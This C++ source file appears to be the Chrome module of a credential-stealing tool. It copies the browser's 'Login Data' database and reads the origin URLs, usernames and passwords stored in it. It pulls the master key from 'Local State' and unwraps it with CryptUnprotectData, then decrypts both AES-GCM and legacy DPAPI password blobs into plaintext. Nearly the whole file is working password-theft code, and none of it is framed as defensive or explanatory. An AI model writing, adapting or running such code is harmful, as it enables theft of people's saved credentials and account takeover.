#include <fstream>
#include <vector>

#include "config.h"
#include "utils.h"

#include "../ext/nlohmann/json.hpp"
#include "../ext/sqlite3.h"

#include "chrome.h"

using json = nlohmann::json;

Chrome::Chrome(std::string path) noexcept
{
	if (!config::chrome)
		return;

	if (!utils::isFolder(path))
		return;


	const char* query = "SELECT origin_url, action_url, username_value, password_value FROM logins";
	const char* dbFileName = "tempdb";

	std::ifstream source(path + "Default\\Login Data", std::ios::binary);
	std::ofstream destination(dbFileName, std::ios::binary);

	destination << source.rdbuf();

	destination.close();
	source.close();

	sqlite3* tempDB = NULL;

	if (sqlite3_open(dbFileName, &tempDB))
		return;

	sqlite3_stmt* stmt = NULL;
	int rc;

	if (rc = sqlite3_prepare(tempDB, query, -1, &stmt, 0); rc != SQLITE_OK)
		goto QUIT;

	rc = sqlite3_step(stmt);

	while (rc == SQLITE_ROW)
	{
		auto pwData = (char*)sqlite3_column_blob(stmt, 3);

		//std::cout << "ORIGIN URL: " << sqlite3_column_text(stmt, 0) << std::endl;
		//std::cout << "ACTION URL: " << sqlite3_column_text(stmt, 1) << std::endl;
		//std::cout << "USERNAME: " << sqlite3_column_text(stmt, 2) << std::endl;

		this->data.append("ORIGIN URL: " + utils::uCharToString(sqlite3_column_text(stmt, 0)) + " \n");
		this->data.append("ACTION URL: " + utils::uCharToString(sqlite3_column_text(stmt, 1)) + " \n");
		this->data.append("USERNAME: " + utils::uCharToString(sqlite3_column_text(stmt, 2)) +" \n");

		if (this->IsVersion10(pwData))
		{
			if (this->GetKey(path + "Local State"))
				this->data.append("PASSWORD: " + this->CleanDecrypted(this->DecryptNew(pwData)) + "\n");
		}
		else
		{
			DATA_BLOB old;
			old.pbData = (BYTE*)pwData;
			old.cbData = sizeof(pwData);

			this->data.append("PASSWORD: " + this->DecryptOld(old) + "\n");
		}

		//in case both passwords fail (?)
		this->data.append("\n");

		rc = sqlite3_step(stmt);
	}

	sqlite3_finalize(stmt);

QUIT:
	sqlite3_close(tempDB);
	source.close();
	destination.close();
	std::remove(dbFileName);
}

bool Chrome::IsVersion10(std::string key) noexcept
{
	return (key.substr(0, 3) == "v10");
}

bool Chrome::GetKey(std::string path) noexcept
{
	std::ifstream file(path, std::ios::binary);
	DATA_BLOB DataVerify = { 0 };

	if (file)
	{

		file.seekg(0, std::ios::end);
		int size = file.tellg();
		file.seekg(0, std::ios::beg);

		std::vector<char> fd(size);
		file.read(fd.data(), size);

		auto jsonData = (std::string)json::parse(std::string(fd.begin(), fd.end()))["os_crypt"]["encrypted_key"];

		auto decoded = utils::base64_decode(jsonData);

		std::string keyTwemp(decoded.begin(), decoded.end());
		std::string key = keyTwemp.substr(5);

		DATA_BLOB inData = { 0 };
		LPWSTR pDescrOut = NULL;

		inData.cbData = key.length();
		inData.pbData = (BYTE*)key.c_str();

		file.close();

		if (CryptUnprotectData(&inData, NULL, NULL, NULL, NULL, 0, &DataVerify))
		{
			LocalFree(DataVerify.pbData);
			this->key = DataVerify;
			return true;
		}
	}

	return false;
}

std::string Chrome::DecryptOld(DATA_BLOB encrypted) noexcept
{
	std::stringstream password(std::string(""));
	DATA_BLOB decrypted = { 0 };

	if (encrypted.pbData == 0)
	{
		LocalFree(encrypted.pbData);
		return { 0 };
	}

	LPWSTR pDescrOut = nullptr;

	if (!CryptUnprotectData(&encrypted, NULL, NULL, NULL, NULL, 0, &decrypted))
	{
		LocalFree(encrypted.pbData);
		return { 0 };
	}

	if (pDescrOut != nullptr)
		LocalFree(pDescrOut);

	char* temp = (char*)decrypted.pbData;

	while (temp != nullptr && isprint(*temp))
	{
		password << *temp;
		temp++;
	}

	//we don't care about empty passwords
	if (password.str() != "\0")
		return std::string("Password: " + password.str() + "\n");
	

	return { 0 };
}

std::string Chrome::DecryptNew(std::string encrypted) noexcept
{
	if (encrypted.size() <= 15)
		return { 0 };


	std::string			iv(encrypted.begin() + 3, encrypted.begin() + 15);
	std::vector<BYTE>	cipher(encrypted.begin() + 15, encrypted.end());

	DWORD originalSize = cipher.size();

	
	//Fill to multiple of 64, we could probably make do with 64 bytes but to be sure we do 128
	for (int i = cipher.size(); i < 128; i++)
		cipher.push_back(0x0);

	NTSTATUS status;

	BCRYPT_ALG_HANDLE				hAlg = NULL;
	BCRYPT_KEY_HANDLE				hKey = 0;
	BCRYPT_AUTH_TAG_LENGTHS_STRUCT	authTagLengths = { 0 };
	DWORD							dwBlockLen = 0;
	DWORD							dwTmpLen = 0;

	status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!BCRYPT_SUCCESS(status))
		goto EXIT;

	status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(status))
		goto EXIT;

	status = BCryptGetProperty(hAlg, BCRYPT_AUTH_TAG_LENGTH, (BYTE*)&authTagLengths, sizeof(authTagLengths), &dwTmpLen, 0);
	if (!BCRYPT_SUCCESS(status))
		goto EXIT;

	status = BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (BYTE*)&dwBlockLen, sizeof(dwBlockLen), &dwTmpLen, 0);
	if (!BCRYPT_SUCCESS(status))
		goto EXIT;

	status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, NULL, key.pbData, key.cbData, 0);
	if (!BCRYPT_SUCCESS(status))
		goto EXIT;

	{
		std::vector<BYTE> macContext(authTagLengths.dwMaxLength);
		std::vector<BYTE> authTag(authTagLengths.dwMinLength);

		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
		BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
		authInfo.pbNonce = (BYTE*)iv.c_str();
		authInfo.cbNonce = iv.size();
		authInfo.pbTag = &authTag[0];
		authInfo.cbTag = authTag.size();
		authInfo.pbMacContext = &macContext[0];
		authInfo.cbMacContext = macContext.size();

		std::vector<BYTE> contextIV(dwBlockLen);


		authInfo.dwFlags = BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG;
		status = BCryptDecrypt
		(
			hKey,
			&cipher[0], 64,
			&authInfo,
			&contextIV[0], contextIV.size(),
			&cipher[0], 64,
			&dwTmpLen, 0
		);

		
		if (!BCRYPT_SUCCESS(status))
			goto EXIT;

		status = BCryptDecrypt
		(
			hKey,
			&cipher[64], 64,
			&authInfo,
			&contextIV[0], contextIV.size(),
			&cipher[64], 64,
			&dwTmpLen, 0
		);

	}

EXIT:
	if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
	if (hKey) BCryptDestroyKey(hKey);

	if (status == 0x0)
	{
		std::string temp = std::string(cipher.begin(), cipher.end());
		auto cut = (originalSize <= 16) ? originalSize : originalSize - 16;

		return temp.substr(0, cut); //begin + original size
	}
	else
		return { 0 };
}

std::string Chrome::CleanDecrypted(std::string decrypted) noexcept
{
	int found;

	if (found = (int)decrypted.find("\r\n\0"); found != std::string::npos)
		decrypted = decrypted.substr(0, found);

	return decrypted;
}